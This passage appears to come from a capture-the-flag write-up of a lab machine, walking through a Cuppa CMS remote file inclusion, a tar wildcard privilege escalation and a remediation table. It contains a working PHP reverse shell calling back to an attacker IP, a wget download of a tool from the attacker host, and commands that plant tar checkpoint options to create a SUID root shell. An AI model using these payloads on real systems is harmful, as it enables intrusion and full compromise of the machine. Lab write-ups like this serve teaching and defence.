4. Phase 3: Exploiting Cuppa CMS RFI & User Access

4.1 Cuppa CMS Remote File Inclusion (RFI)

Researching Cuppa CMS vulnerabilities reveals that alerts/alertConfigField.php improperly includes the remote file specified by the urlConfig parameter:

/alerts/alertConfigField.php?urlConfig=<URL>

4.2 Setting Up Listener & Hosting PHP Reverse Shell

We start a listener on our attacker machine:

penelope nc -p 4444

We create a PHP reverse shell script named phpreverse.php targeting 192.168.132.94:4444:

nano phpreverse.php


<?php
// Reverse-shell callback for an authorized lab only.
// Replace ATTACKER_VPN_IP with an address reachable from the target.
$host = '192.168.132.94';
$port = 4444;
$sock = @fsockopen($host, $port, $errno, $errstr, 5);
if (!$sock) {
    http_response_code(500);
    exit("connect failed: $errno\n");
}
$spec = [0 => $sock, 1 => $sock, 2 => $sock];
$proc = @proc_open('/bin/sh -i', $spec, $pipes);
if (is_resource($proc)) {
    proc_close($proc);
}
fclose($sock);
?>

We host phpreverse.php with Python HTTP server on port 8000:

python3 -m http.server 8000

5. Phase 4: Privilege Escalation to Root

5.1 Analyzing the Backup Cron Script

In /home/milesdyson/backups, we examine backup.sh:

www-data@skynet:/home/milesdyson/backups$ cat backup.sh


#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

The script navigates to /var/www/html and executes tar cf ... *. Using the wildcard * with tar is susceptible to Tar Wildcard Command Injection.

5.2 Process Snooping with pspy64

To confirm whether backup.sh is triggered automatically by root, we download and execute pspy64:

cd /tmp
wget http://192.168.132.94:8000/pspy64
chmod +x pspy64
./pspy64

pspy64 captures the scheduled execution by root (UID=0):

2026/11/05 09:15:01 CMD: UID=0 PID=3197 | tar cf /home/milesdyson/backups/backup.tgz 45kra24zxs28v3yd admin ai config css image.png index.html js style.css
2026/11/05 09:15:01 CMD: UID=0 PID=3196 | /bin/bash /home/milesdyson/backups/backup.sh
2026/11/05 09:15:01 CMD: UID=0 PID=3195 | /bin/sh -c /home/milesdyson/backups/backup.sh
2026/11/05 09:15:01 CMD: UID=0 PID=3194 | /usr/sbin/CRON -f

5.3 Exploiting Tar Wildcard to Create SUID Rootbash

Since www-data has write permissions in /var/www/html, we leverage tar's --checkpoint and --checkpoint-action command-line flags by creating files named after these arguments:

cd /var/www/html
cat > shell.sh <<'EOF'
#!/bin/sh
cp /bin/bash rootbash && chmod +s rootbash
EOF

chmod 700 shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
ls -la -- shell.sh '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'

When the cron job runs, tar expands * to include --checkpoint=1 and --checkpoint-action=exec=sh shell.sh. Tar interprets these arguments as options and executes shell.sh under root privileges.

6. Security Mitigations & Remediation

Vulnerability / Misconfiguration Impact Recommended Remediation
Anonymous SMB Access Information leakage of internal wordlists (log1.txt) and security alerts. Disable guest/anonymous access in Samba configuration (map to guest = Never).
Plaintext Password in Email Full compromise of milesdyson SMB share and internal documentation. Never transmit plain passwords in unencrypted communications; enforce multi-factor authentication (MFA).
Cuppa CMS Remote File Inclusion (RFI) Arbitrary PHP code execution resulting in remote shell as www-data. Remove obsolete applications, disable allow_url_include in php.ini, and sanitize file inclusion paths.
Tar Wildcard Expansion in Root Cron Arbitrary command execution leading to full root compromise. Avoid using wildcards (*) with tar in cron scripts; specify explicit paths or use -- to delimit options.
